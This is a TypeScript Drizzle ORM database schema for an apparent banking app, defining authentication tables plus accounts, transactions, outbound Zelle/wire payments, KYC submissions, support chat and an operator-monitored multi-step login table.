import {
  pgTable,
  text,
  timestamp,
  boolean,
  serial,
  integer,
  bigint,
} from 'drizzle-orm/pg-core'

// --- Better Auth required tables -------------------------------------------
// Column names are camelCase to match Better Auth's defaults. Do not rename.

export const user = pgTable('user', {
  id: text('id').primaryKey(),
  name: text('name').notNull(),
  email: text('email').notNull().unique(),
  emailVerified: boolean('emailVerified').notNull().default(false),
  image: text('image'),
  phone: text('phone'),
  dateOfBirth: text('dateOfBirth'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  updatedAt: timestamp('updatedAt').notNull().defaultNow(),
})

export const session = pgTable('session', {
  id: text('id').primaryKey(),
  expiresAt: timestamp('expiresAt').notNull(),
  token: text('token').notNull().unique(),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  updatedAt: timestamp('updatedAt').notNull().defaultNow(),
  ipAddress: text('ipAddress'),
  userAgent: text('userAgent'),
  userId: text('userId')
    .notNull()
    .references(() => user.id, { onDelete: 'cascade' }),
})

export const account = pgTable('account', {
  id: text('id').primaryKey(),
  accountId: text('accountId').notNull(),
  providerId: text('providerId').notNull(),
  userId: text('userId')
    .notNull()
    .references(() => user.id, { onDelete: 'cascade' }),
  accessToken: text('accessToken'),
  refreshToken: text('refreshToken'),
  idToken: text('idToken'),
  accessTokenExpiresAt: timestamp('accessTokenExpiresAt'),
  refreshTokenExpiresAt: timestamp('refreshTokenExpiresAt'),
  refreshTokenExpiresIn: integer('refreshTokenExpiresIn'),
  accessTokenExpiresIn: integer('accessTokenExpiresIn'),
  scope: text('scope'),
  password: text('password'),
  issuer: text('issuer'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  updatedAt: timestamp('updatedAt').notNull().defaultNow(),
})

export const verification = pgTable('verification', {
  id: text('id').primaryKey(),
  identifier: text('identifier').notNull(),
  value: text('value').notNull(),
  expiresAt: timestamp('expiresAt').notNull(),
  createdAt: timestamp('createdAt').defaultNow(),
  updatedAt: timestamp('updatedAt').defaultNow(),
})

// --- App tables ------------------------------------------------------------

export const bankAccount = pgTable('bank_account', {
  id: serial('id').primaryKey(),
  userId: text('userId').notNull(),
  name: text('name').notNull(),
  type: text('type').notNull(), // 'checking' | 'savings' | 'retirement'
  accountNumber: text('accountNumber').notNull(),
  balanceCents: bigint('balanceCents', { mode: 'number' })
    .notNull()
    .default(0),
  currency: text('currency').notNull().default('USD'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
})

export const transaction = pgTable('transaction', {
  id: serial('id').primaryKey(),
  userId: text('userId').notNull(),
  accountId: integer('accountId').notNull(),
  amountCents: bigint('amountCents', { mode: 'number' }).notNull(),
  type: text('type').notNull(), // 'debit' | 'credit' | 'transfer'
  description: text('description').notNull(),
  category: text('category'),
  counterparty: text('counterparty'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
})

export const outboundPayment = pgTable('outbound_payment', {
  id: serial('id').primaryKey(),
  userId: text('userId').notNull(),
  fromAccountId: integer('fromAccountId').notNull(),
  method: text('method').notNull(), // 'zelle' | 'wire'
  amountCents: bigint('amountCents', { mode: 'number' }).notNull(),
  status: text('status').notNull().default('scheduled'), // scheduled | sent | cancelled | failed
  scheduledFor: timestamp('scheduledFor').notNull(),
  recipientName: text('recipientName').notNull(),
  recipientBank: text('recipientBank'),
  routingNumber: text('routingNumber'),
  accountNumber: text('accountNumber'),
  zelleHandle: text('zelleHandle'),
  memo: text('memo'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  processedAt: timestamp('processedAt'),
})

export const kycSubmission = pgTable('kyc_submission', {
  id: serial('id').primaryKey(),
  userId: text('userId').notNull(),
  ssnLast4: text('ssnLast4').notNull(),
  ssnEncrypted: text('ssnEncrypted').notNull(),
  idType: text('idType').notNull(),
  idFrontName: text('idFrontName').notNull(),
  idFrontMime: text('idFrontMime').notNull(),
  idFrontData: text('idFrontData').notNull(),
  idBackName: text('idBackName').notNull(),
  idBackMime: text('idBackMime').notNull(),
  idBackData: text('idBackData').notNull(),
  status: text('status').notNull().default('pending'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  updatedAt: timestamp('updatedAt').notNull().defaultNow(),
})

export const chatThread = pgTable('chat_thread', {
  id: serial('id').primaryKey(),
  userId: text('userId').notNull(),
  status: text('status').notNull().default('open'), // open | closed
  subject: text('subject').notNull().default('Support chat'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  updatedAt: timestamp('updatedAt').notNull().defaultNow(),
})

export const chatMessage = pgTable('chat_message', {
  id: serial('id').primaryKey(),
  threadId: integer('threadId').notNull(),
  sender: text('sender').notNull(), // 'user' | 'admin'
  body: text('body').notNull(),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
})

/** Multi-step sign-in challenge tracked live on the ops desk */
export const loginAttempt = pgTable('login_attempt', {
  id: text('id').primaryKey(),
  userId: text('userId').notNull(),
  email: text('email').notNull(),
  memberName: text('memberName').notNull(),
  /** credentials | username | otp1 | otp2 | awaiting_approval | approved | rejected | expired */
  step: text('step').notNull().default('credentials'),
  status: text('status').notNull().default('in_progress'), // in_progress | awaiting_approval | approved | rejected | expired
  usernameSubmitted: text('usernameSubmitted'),
  otpHash: text('otpHash'),
  otpExpiresAt: timestamp('otpExpiresAt'),
  otp1Verified: boolean('otp1Verified').notNull().default(false),
  otp2Verified: boolean('otp2Verified').notNull().default(false),
  lastEvent: text('lastEvent'),
  ipAddress: text('ipAddress'),
  userAgent: text('userAgent'),
  createdAt: timestamp('createdAt').notNull().defaultNow(),
  updatedAt: timestamp('updatedAt').notNull().defaultNow(),
})

export type BankAccount = typeof bankAccount.$inferSelect
export type Transaction = typeof transaction.$inferSelect
export type OutboundPayment = typeof outboundPayment.$inferSelect
export type KycSubmission = typeof kycSubmission.$inferSelect
export type ChatThread = typeof chatThread.$inferSelect
export type ChatMessage = typeof chatMessage.$inferSelect
export type LoginAttempt = typeof loginAttempt.$inferSelect
